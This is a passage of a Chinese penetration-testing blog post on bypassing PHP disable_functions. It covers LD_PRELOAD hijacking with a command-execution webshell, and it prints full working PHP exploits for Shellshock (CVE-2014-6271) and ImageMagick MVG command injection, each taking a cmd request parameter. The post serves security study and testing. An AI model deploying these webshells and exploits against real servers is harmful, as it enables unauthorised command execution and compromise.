<p>php基于C语言开发，linux也基于C语言开发，函数实现上有相同之处。我们可以追踪php自带的函数执行时的函数调用，找到可以启动新进程的函数，但启动的方式不能是<strong>exec,system,passthru</strong>等这种被过滤的。如原作者发现了php中的mail函数在运行时可以通过execve启用新进程：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace -f php mail.php 2&gt;&amp;1 |grep -A2 -B2 execve</span><br></pre></td></tr></table></figure>

<p>如：error_log函数也会调用execve创建新进程，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=./test.so&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_log</span>(<span class="string">&quot;test&quot;</span>,<span class="number">1</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><p>使用LD_PRELOAD劫持函数存在一些问题，如：</p>
<blockquote>
<p>一、有些函数服务器不支持，如mail函数实际依赖的是sendmail，但是目标服务器未安装。</p>
<p>二、通过LD_PRELOAD劫持了启动进程的相关函数，如果劫持后启动的新进程同样调用该函数，那么如果不在新进程启动前取消LD_PRELOAD，则将陷入死循环。通常做法调用 <code>unsetenv(&quot;LD_PRELOAD&quot;)</code>删除环境变量。这在大部分linux上可行，但在centos上却无效，因为centos自己也hook 了unsetenv()，在其内部启动了其他进程，还没有删除LD_PRELOAD就又被劫持，导致无限循环。</p>
</blockquote>
<p>基于这些问题，有师傅做了一个优化，项目<a class="link"   target="_blank" rel="noopener" href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" >地址<i class="fas fa-external-link-alt"></i></a>。作者选择预加载实现<code>__attribute__((constructor))</code>构造函数的动态库文件，该函数会在main()之前执行，因此无需劫持某个函数即可执行我们的代码。</p>
<p>项目中有三个关键文件：</p>
<ul>
<li>bypass_disablefunc.php</li>
<li>bypass_disablefunc_x64.so</li>
<li>bypass_disablefunc_x86.so</li>
</ul>
<p>bypass_disablefunc.php 为命令执行 webshell，提供三个 GET 参数：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bypass_disablefunc.php?cmd=<span class="built_in">pwd</span>&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure>

<p>一是cmd参数，待执行的系统命令；</p>
<p>二是outpath参数，保存命令执行输出的文件路径（如&#x2F;tmp&#x2F;xx），便于在页面上显示，另外该参数，你应注意web是否有读写权限、网络是否可跨目录访问、文件将被覆盖和删除系统等卫星；</p>
<p>三是sopath参数，指定劫持函数的共享对象的绝对路径（如&#x2F;var&#x2F;www&#x2F;bypass_disablex64.so），另外，关于该参数，你应该注意网络是否可以跨目录访问它。</p>
<h2 id="ShellShock漏洞绕过"><a href="#ShellShock漏洞绕过" class="headerlink" title="ShellShock漏洞绕过"></a>ShellShock漏洞绕过</h2><p>利用ShellShock，即bash破壳漏洞（CVE-2014-6271）绕过。该漏洞存在于bash 1.14 – 4.3版本中，漏洞原因是以<code>()&#123;</code>开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。该漏洞要求php &lt; 5.6.2，分析文章可参考<a class="link"   target="_blank" rel="noopener" href="https://www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html" >PHP Execute Command Bypass Disable_functions<i class="fas fa-external-link-alt"></i></a>。POC：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) </span></span><br><span class="line"><span class="comment"># Google Dork: none </span></span><br><span class="line"><span class="comment"># Date: 10/31/2014 </span></span><br><span class="line"><span class="comment"># Exploit Author: Ryan King (Starfall) </span></span><br><span class="line"><span class="comment"># Vendor Homepage: http://php.net </span></span><br><span class="line"><span class="comment"># Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror </span></span><br><span class="line"><span class="comment"># Version: 5.* (tested on 5.6.2) </span></span><br><span class="line"><span class="comment"># Tested on: Debian 7 and CentOS 5 and 6 </span></span><br><span class="line"><span class="comment"># CVE: CVE-2014-6271 </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shellshock</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123; <span class="comment">// Execute a command via CVE-2014-6271 @mail.c:283 </span></span><br><span class="line">   <span class="variable">$tmp</span> = <span class="title function_ invoke__">tempnam</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;data&quot;</span>); </span><br><span class="line">   <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="subst">$cmd</span> &gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>); </span><br><span class="line">   <span class="comment">// In Safe Mode, the user may only alter environment variableswhose names </span></span><br><span class="line">   <span class="comment">// begin with the prefixes supplied by this directive. </span></span><br><span class="line">   <span class="comment">// By default, users will only be able to set environment variablesthat </span></span><br><span class="line">   <span class="comment">// begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, </span></span><br><span class="line">   <span class="comment">// PHP will let the user modify ANY environment variable! </span></span><br><span class="line">   <span class="comment">//mail(&quot;a@127.0.0.1&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;-bv&quot;); // -bv so we don&#x27;t actuallysend any mail </span></span><br><span class="line">   <span class="title function_ invoke__">error_log</span>(<span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">   <span class="variable">$output</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmp</span>); </span><br><span class="line">   @<span class="title function_ invoke__">unlink</span>(<span class="variable">$tmp</span>); </span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$output</span> != <span class="string">&quot;&quot;</span>) <span class="keyword">return</span> <span class="variable">$output</span>; </span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">return</span> <span class="string">&quot;No output, or not vuln.&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">shellshock</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>]); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>





<h2 id="ImageMagick漏洞绕过"><a href="#ImageMagick漏洞绕过" class="headerlink" title="ImageMagick漏洞绕过"></a>ImageMagick漏洞绕过</h2><p>ImageMagick是一款使用广泛的图片处理程序，Discuz、Drupal、Wordpress等常用CMS中也调用了ImageMagick扩展或ImageMagick库进行图片处理，包括图片的伸缩、切割、水印、格式转换等等。但在ImageMagick6.9.3-9以前的所有版本中都存在一个漏洞，当用户传入一个包含『畸形内容』的图片的时候，就有可能触发命令注入，该漏洞可用于绕过disable_functions，EXP：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Disable Functions: &quot;</span> . <span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;disable_functions&#x27;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span> = PHP_SAPI == <span class="string">&#x27;cli&#x27;</span> ? <span class="variable">$argv</span>[<span class="number">1</span>] : <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$command</span> == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$command</span> = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$exploit</span> = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">push graphic-context</span></span><br><span class="line"><span class="string">viewbox 0 0 640 480</span></span><br><span class="line"><span class="string">fill &#x27;url(https://example.com/image.jpg&quot;|<span class="subst">$command</span>&quot;)&#x27;</span></span><br><span class="line"><span class="string">pop graphic-context</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;KKKK.mvg&quot;</span>, <span class="variable">$exploit</span>);</span><br><span class="line"><span class="variable">$thumb</span> = <span class="keyword">new</span> <span class="title class_">Imagick</span>();</span><br><span class="line"><span class="variable">$thumb</span>-&gt;<span class="title function_ invoke__">readImage</span>(<span class="string">&#x27;KKKK.mvg&#x27;</span>);</span><br><span class="line"><span class="variable">$thumb</span>-&gt;<span class="title function_ invoke__">writeImage</span>(<span class="string">&#x27;KKKK.png&#x27;</span>);</span><br><span class="line"><span class="variable">$thumb</span>-&gt;<span class="title function_ invoke__">clear</span>();</span><br><span class="line"><span class="variable">$thumb</span>-&gt;<span class="title function_ invoke__">destroy</span>();</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="string">&quot;KKKK.mvg&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="string">&quot;KKKK.png&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="PHP-FPM绕过"><a href="#PHP-FPM绕过" class="headerlink" title="PHP FPM绕过"></a>PHP FPM绕过</h2><p>php-fpm是一个fastcgi协议解析器，负责按照fastcgi的协议将TCP流解析成数据。PHP-FPM默认监听9000端口，我们可以自己构造fastcgi协议与fpm进行通信。参考文章：<a class="link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/75114351?from_voters_page=true" >攻击PHP-FPM 实现Bypass Disable Functions<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="PHP-FFI-绕过"><a href="#PHP-FFI-绕过" class="headerlink" title="PHP FFI 绕过"></a>PHP FFI 绕过</h2><p>PHP FFI (Foreign Function interface)，是自PHP7.4开始提供的一个PHP拓展。该拓展让开发者可以方便的调用C语言写的各种库，实现了高级语言的相互调用。当PHP所有的命令执行函数被禁用后，通过PHP 7.4的新特性FFI可以实现用PHP代码调用C代码的方式，先声明C中的命令执行函数，然后再通过FFI变量调用该C函数即可bypass disable_functions。</p>
<h2 id="Windows-COM组件绕过"><a href="#Windows-COM组件绕过" class="headerlink" title="Windows COM组件绕过"></a>Windows COM组件绕过</h2><p>Windows环境下，当php.ini的设置项<code>com.allow_dcom=true</code>时，可以通过COM组件执行系统命令，资料参考：<a class="link"   target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/4553/" >PHP 5.x COM - Safe Mode &#x2F; disable_functions Bypass<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="Windows-PHP拓展win32std绕过"><a href="#Windows-PHP拓展win32std绕过" class="headerlink" title="Windows PHP拓展win32std绕过"></a>Windows PHP拓展win32std绕过</h2><p>win32std是一个很老的PHP扩展，其中的win_shell_execute函数可以用来执行Windows系统命令，参考<a class="link"   target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/4218/" >PHP 5.2.3 Win32std - ‘win_shell_execute’ Safe Mode &#x2F; disable_functions Bypass<i class="fas fa-external-link-alt"></i></a>。</p>
<h1 id="相关工具"><a href="#相关工具" class="headerlink" title="相关工具"></a>相关工具</h1><p><a class="link"   target="_blank" rel="noopener" href="https://github.com/verctor/BShell" >https://github.com/verctor/BShell<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/teambi0s/dfunc-bypasser" >https://github.com/teambi0s/dfunc-bypasser<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/obolu/Bypass_Disable_functions" >https://github.com/obolu/Bypass_Disable_functions<i class="fas fa-external-link-alt"></i></a>  搭建docker测试环境</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/zw1sh/p/12632126.html" >https://www.cnblogs.com/zw1sh/p/12632126.html<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://www.meetsec.cn/index.php/archives/45/" >https://www.meetsec.cn/index.php/archives/45/<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/paper/readme.old.md" >https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/paper/readme.old.md<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/208451" >https://www.anquanke.com/post/id/208451<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/197745" >https://www.anquanke.com/post/id/197745<i class="fas fa-external-link-alt"></i></a></li>
</ul>

        </div>

        
            <div class="post-copyright-info">
                <div class="article-copyright-info-container">
    <ul>
        <li>Post title：bypass php disable_functions</li>
        <li>Post author：ssooking</li>
        <li>Create time：2021-02-23 10:11:00</li>
        <li>
            Post link：https://ssooking.github.io/2021/02/bypass-php-disable-functions/
        </li>
        <li>
            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
        </li>
    </ul>
</div>

            </div>
        

        
            <ul class="post-tags-box">
                
                    <li class="tag-item">
                        <a href="/tags/bypass/">#bypass</a>&nbsp;
                    </li>
                
            </ul>
        

        
            <div class="article-nav">
                
                    <div class="article-prev">
                        <a class="prev"
                           rel="prev"
                           href="/2021/11/codeql%E5%85%A5%E9%97%A8/"
                        >
                            <span class="left arrow-icon flex-center">
                              <i class="fas fa-chevron-left"></i>
                            </span>
                            <span class="title flex-center">
                                <span class="post-nav-title-item">CodeQL入门</span>
                                <span class="post-nav-item">Prev posts</span>
                            </span>
                        </a>
                    </div>
                
                
                    <div class="article-next">
                        <a class="next"
                           rel="next"
                           href="/2020/12/%E4%BD%BF%E7%94%A8dumpit%E4%BB%8Eram%E8%BD%AC%E5%82%A8%E4%B8%AD%E6%8F%90%E5%8F%96hash/"
                        >
                            <span class="title flex-center">
                                <span class="post-nav-title-item">使用DumpIt从RAM转储中提取Hash</span>
                                <span class="post-nav-item">Next posts</span>
                            </span>
                            <span class="right arrow-icon flex-center">
                              <i class="fas fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        

        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            <footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
              <span>2016</span>
              -
            
            2023&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">ssooking</a>
        </div>
        
        <div class="theme-info info-item">
            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3</a>
        </div>
        
        
    </div>
</footer>

        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="tools-list">
        <!-- TOC aside toggle -->
        
            <li class="tools-item page-aside-toggle">
                <i class="fas fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
    </ul>
</div>

        </div>
    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-expand-width flex-center">
            <i class="fas fa-arrows-alt-h"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        

        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="fas fa-arrow-up"></i>
            </li>
        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
    </ul>
</div>

    </div>

    
        <aside class="page-aside">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%95%E8%BF%87disable-functions"><span class="nav-number">2.</span> <span class="nav-text">绕过disable_functions</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E6%9C%AA%E8%BF%87%E6%BB%A4%E7%9A%84%E5%87%BD%E6%95%B0"><span class="nav-number">2.1.</span> <span class="nav-text">使用未过滤的函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%9A%81%E5%89%91bypass%E6%8F%92%E4%BB%B6"><span class="nav-number">2.2.</span> <span class="nav-text">蚁剑bypass插件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8LD-PRELOAD%E5%8A%AB%E6%8C%81%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0"><span class="nav-number">2.3.</span> <span class="nav-text">利用LD_PRELOAD劫持系统函数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BC%98%E5%8C%96"><span class="nav-number">2.3.1.</span> <span class="nav-text">优化</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ShellShock%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87"><span class="nav-number">2.4.</span> <span class="nav-text">ShellShock漏洞绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ImageMagick%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87"><span class="nav-number">2.5.</span> <span class="nav-text">ImageMagick漏洞绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP-FPM%E7%BB%95%E8%BF%87"><span class="nav-number">2.6.</span> <span class="nav-text">PHP FPM绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP-FFI-%E7%BB%95%E8%BF%87"><span class="nav-number">2.7.</span> <span class="nav-text">PHP FFI 绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows-COM%E7%BB%84%E4%BB%B6%E7%BB%95%E8%BF%87"><span class="nav-number">2.8.</span> <span class="nav-text">Windows COM组件绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows-PHP%E6%8B%93%E5%B1%95win32std%E7%BB%95%E8%BF%87"><span class="nav-number">2.9.</span> <span class="nav-text">Windows PHP拓展win32std绕过</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7"><span class="nav-number">3.</span> <span class="nav-text">相关工具</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li></ol>
    </div>
</div>
        </aside>
    

    <div class="image-viewer-container">
    <img src="">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="Search..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="popup-btn-close">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>




<script src="/js/utils.js"></script>

<script src="/js/main.js"></script>

<script src="/js/header-shrink.js"></script>

<script src="/js/back2top.js"></script>

<script src="/js/dark-light-toggle.js"></script>



    
<script src="/js/local-search.js"></script>




    
<script src="/js/code-copy.js"></script>





<div class="post-scripts">
    
        
<script src="/js/left-side-toggle.js"></script>

<script src="/js/libs/anime.min.js"></script>

<script src="/js/toc.js"></script>

    
</div>



</body>
</html>
